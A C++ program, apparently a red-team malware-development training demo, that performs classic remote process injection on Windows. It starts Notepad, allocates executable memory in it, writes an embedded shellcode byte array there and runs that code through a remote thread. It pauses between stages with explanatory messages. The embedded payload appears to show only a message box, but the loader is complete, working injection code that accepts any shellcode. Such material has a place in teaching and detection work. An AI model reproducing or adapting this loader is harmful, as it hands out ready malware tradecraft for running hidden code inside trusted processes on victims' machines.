#include <iostream>
#include <windows.h>
#include <tlHelp32.h>
#include <chrono>
#include <thread>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

unsigned char shellcode[] = {
  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
  0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
  0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
  0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
  0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
  0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
  0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
  0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
  0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
  0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
  0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
  0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
  0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
  0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
  0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
  0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
  0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
  0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
  0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
  0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00
};

int main()
{
    
    // - SECTION 1: Start the victim process
    printf("%s To start, we will open Notepad\n", k);
    system("pause");
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Start the Notepad process
    int status = CreateProcess(TEXT("C:\\Windows\\System32\\notepad.exe"), // Application name
        NULL,   // Command line arguments
        NULL,   // Process handle not inheritable
        NULL,   // Thread handle not inheritable
        FALSE,  // Set handle inheritance to FALSE
        0,      // No creation flags
        NULL,   // Use parent's environment block
        NULL,   // Use parent's starting directory 
        &si,    // Pointer to STARTUPINFO structure
        &pi);    // Pointer to PROCESS_INFORMATION structure

    if (!status) {
        printf("%s Failed to open process, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    hProcess = pi.hProcess;
    // Sleep for one second to allow Notepad to open
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));

    // - SECTION 2: Allocate memory space
    printf("%s Now, we will allocate the memory for our injection\n", k);
    system("pause");
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zu-bytes with rwx permissions\n", k, sizeof(shellcode));

    printf("%s Now we will write the shellcode into the allocated memory\n", k);
    system("pause");

    // - SECTION 3: Write Memory space
    WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
    printf("%s wrote %zu-bytes to process memory\n", k, sizeof(shellcode));

    // - SECTION 4: Create thread to run our payload
    printf("%s Now we will create the thread that will execute our shellcode\n", k);
    system("pause");
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

    if (hThread == NULL) {
        printf("%s Failed to get a handle to the thread, error: %ld", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", k, TID, hThread);

    printf("%s Closing handles\n", i);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s Process injection concluded! Press enter to exit\n", k);
    getchar();

    return EXIT_SUCCESS;
}
